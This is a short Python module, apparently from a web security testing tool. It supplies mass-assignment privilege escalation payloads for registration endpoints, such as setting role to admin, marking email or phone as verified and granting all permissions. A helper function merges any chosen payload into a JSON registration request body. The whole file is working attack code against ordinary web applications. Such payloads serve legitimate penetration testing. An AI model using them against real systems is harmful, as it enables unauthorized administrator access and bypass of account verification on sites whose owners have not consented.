"""
Registration Privilege Escalation Attacks
"""

from typing import List, Dict

class RegistrationPrivEsc:
    @staticmethod
    def get_escalation_payloads() -> List[Dict[str, any]]:
        """Return privilege escalation payloads for registration endpoints"""
        return [
            {"role": "admin"},
            {"is_admin": "true"},
            {"is_admin": True},
            {"is_admin": 1},
            {"admin": True},
            {"user_role": "administrator"},
            {"account_level": "premium"},
            {"subscription": "enterprise"},
            {"is_verified": True},
            {"email_verified": True},
            {"phone_verified": True},
            {"status": "approved"},
            {"group_id": 1},
            {"permissions": "all"}
        ]
    
    @staticmethod
    def inject_into_registration(body: str, payload: Dict) -> str:
        """Inject privilege escalation into registration request"""
        import json
        try:
            data = json.loads(body)
            data.update(payload)
            return json.dumps(data)
        except:
            return body
